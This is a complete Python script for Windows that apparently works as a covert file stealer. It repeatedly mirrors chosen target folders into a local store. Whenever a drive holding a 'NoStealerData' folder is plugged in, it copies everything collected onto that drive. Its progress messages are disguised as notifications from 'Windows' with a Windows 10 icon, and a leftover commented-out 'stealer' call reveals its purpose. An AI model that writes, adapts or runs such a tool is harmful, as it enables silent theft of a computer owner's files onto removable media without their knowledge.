import json
import os
import shutil
import sys
import threading
import time
from queue import Queue
from typing import Callable, List

import win10toast
import win32api

NOTICE = True
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))
SETTINGS_PATH = os.path.join(CURRENT_PATH, "data", "settings.json")
TARGET_SETTINGS_PATH = os.path.join(CURRENT_PATH, "data", "targets.txt")
WIN_ICON_PATH = os.path.join(CURRENT_PATH, "Windows10.ico")
# 目标文件夹路径
# target_folders = [r"C:\Path\To\TargetFolder"]
# data_folder = r"C:\Path\To\DataFolder"
# usb_drive_folder = r"D:\Path\To\USBDrive"
target_folders = []
notice: bool = True
data_folder = fr"{CURRENT_PATH}\data"
usb_drive_folder_rel_path = r".\NoStealerData"


class ToastNotifier(win10toast.ToastNotifier):
    def __init__(self):
        super().__init__()

    def on_destroy(self, hwnd, msg, wparam, lparam):
        super().on_destroy(hwnd, msg, wparam, lparam)
        return 0


def settings(_write=False):
    if os.path.exists(SETTINGS_PATH) and os.path.exists(TARGET_SETTINGS_PATH) and not _write:
        try:
            settings_dict = json.load(open(SETTINGS_PATH))
            globals().update(settings_dict)
            log("settings load:\n{}".format("\n".join(f"{k}: {v}\n" for k, v in settings_dict.items())))
            with open(TARGET_SETTINGS_PATH, "r", encoding="utf-8") as f:
                # 去除空行
                lines = [line for line in f.read().split("\n") if line != ""]
            globals()["target_folders"] = lines
            log("target set:{}".format("\n".join(lines)))
        except Exception:
            return settings(_write=True)
    else:  # init settings
        if not os.path.exists(data_folder):
            os.makedirs(data_folder, exist_ok=True)
        with open(SETTINGS_PATH, "w") as f:
            settings_dict = dict(
                data_folder=data_folder,
                usb_drive_folder_rel_path=usb_drive_folder_rel_path,
                notice=notice,
            )
            json.dump(settings_dict, f)
        log("settings write:\n{}".format("\n".join(f"{k}: {v}\n" for k, v in settings_dict.items())))
        with open(TARGET_SETTINGS_PATH, "w", encoding="utf-8") as f:
            f.write("\n".join(target_folders))
        log("target set:{}".format("\n".join(target_folders)))


def get_drive_letters():
    """
    :return:list[r"C:\", r"D:\"]
    """
    drives = win32api.GetLogicalDriveStrings()
    drive_letters = list(drives.split('\000')[:-1])  # 分割字符串并去除最后一个空字符串
    return drive_letters


# def get_all_drive_letters_psutil():
#     """Using the psutil module to get all drive letters, including removable ones."""
#     import psutil
#     return [part.mountpoint for part in psutil.disk_partitions()]


def copy(src, dst):
    target_dir = os.path.split(dst)[0]
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    shutil.copy2(src, dst)


# wrapper class  装饰器类
class Threaded:
    daemon = True

    class Thread(threading.Thread):
        def __init__(self, target, args, kwargs, daemon=False):
            self.result = None
            self.target = target
            self.args = args
            self.kwargs = kwargs
            super().__init__(target=target, args=args, kwargs=kwargs, daemon=daemon)

        def run(self) -> None:
            self.result = self.target(*self.args, **self.kwargs)

    class ThreadedResult(object):
        def __init__(self, thread):
            self.thread: Threaded.Thread = thread
            self.thread.start()

        def __call__(self):
            return self.result

        def __repr__(self):
            return self.result

        def __int__(self):
            return int(self.result)

        def __float__(self):
            return float(self.result)

        def __str__(self):
            return str(self.result)

        def __bytes__(self):
            return bytes(self.result)

        @property
        def result(self):
            return self.thread.result

    def __init__(self, func, warp=False):  # 接受函数
        if warp:
            self.func: Callable = lambda *args, **kwargs: func(*args, **kwargs)
        else:
            self.func: Callable = func

    def __call__(self, *func_args, **func_kwargs):  # 返回函数
        thread = self.Thread(target=self.func, args=func_args, kwargs=func_kwargs, daemon=self.daemon)
        return self.ThreadedResult(thread=thread)


def log(msg):
    output_queue.put(msg)


@Threaded
def log_manager():
    while True:
        print(output_queue.get())


class DataUsbCopy:
    def __init__(self):
        log(f"DataUsbCopy login")
        self.main_thread = self.main(self)
        self.copied = False
        self.detected = False

    @Threaded
    def main(self):
        while True:
            # 检查U盘是否插入并复制文件
            self.copy()
            if self.copied:
                time.sleep(60)  # 防止二次复制
            elif self.detected:
                time.sleep(45)
            else:
                time.sleep(6)

    def copy(self):
        self.copied = False
        self.detected = False
        for drive in get_drive_letters():
            usb_drive_folder = os.path.join(drive, usb_drive_folder_rel_path)
            if os.path.exists(usb_drive_folder) and os.path.exists(data_folder):
                if self.detected:
                    toast_notifier.show_toast("Windows", f"USB Detected: {drive}:\\", icon_path=WIN_ICON_PATH,
                                              threaded=True)
                self.detected = True
                log(f"USB Detected: {drive}")
                copied_files = list()
                for root, _, files in os.walk(data_folder):
                    relative_path = os.path.relpath(root, data_folder)
                    usb_disk_folder = os.path.join(usb_drive_folder, relative_path)
                    if not os.path.exists(usb_disk_folder):
                        os.makedirs(usb_disk_folder, exist_ok=True)
                    for file in files:
                        src_file = os.path.join(root, file)
                        src_file_size = os.path.getsize(src_file)
                        disk_file = os.path.join(usb_disk_folder, file)
                        if not os.path.exists(disk_file) or src_file_size != os.path.getsize(disk_file):
                            log(f"DataUsbCopy Copying {src_file} to {disk_file}")
                            copy(src_file, disk_file)
                            self.copied = True
                            copied_files.append(disk_file)
                if len(copied_files):
                    message = f"Updated {len(copied_files)}files"
                else:
                    message = "The file is already up to date."
                toast_notifier.show_toast("Windows", message, icon_path=WIN_ICON_PATH, threaded=True)
        return


class TargetDataCopy:
    def __init__(self, target_folder: str):
        log(f"TargetDataCopy {target_folder} login")
        self.target_folder: str = target_folder
        self.main_thread = self.main(self)

    @Threaded
    def main(self):
        while True:
            if self.copy():
                data_usb_copy.copy()
            time.sleep(6)

    def copy(self) -> bool:
        copied = False
        target_folder = self.target_folder
        target_name = os.path.split(target_folder)[-1]
        if os.path.exists(target_folder) and os.path.exists(data_folder):
            for root, _, files in os.walk(target_folder):
                relative_path = os.path.relpath(root, target_folder)
                copy_data_folder = os.path.join(data_folder, target_name, relative_path)
                if not os.path.exists(copy_data_folder):
                    os.makedirs(copy_data_folder, exist_ok=True)
                for file in files:
                    src_file = os.path.join(root, file)
                    src_file_size = os.path.getsize(src_file)
                    data_file = os.path.join(copy_data_folder, file)
                    if not os.path.exists(data_file) or src_file_size != os.path.getsize(data_file):
                        log(f"TargetDataCopy {self.target_folder} Copying {src_file} to {data_file}")
                        copy(src_file, data_file)
                        copied = True
        return copied


# if __name__ == "__main__":
#     print(get_drive_letters())
#     print(get_all_drive_letters_psutil())
# 启动文件监视器
if __name__ == "__main__":
    output_queue = Queue()
    toast_notifier = ToastNotifier()
    log_manager()
    settings()
    instance_list: List[TargetDataCopy] = []
    data_usb_copy = DataUsbCopy()
    # for folder in target_folders:
    #     instance_list.append(stealer(folder))
    for folder in target_folders:
        instance_list.append(TargetDataCopy(folder))
    for instance in instance_list:
        instance.main_thread.thread.join()
    sys.exit()
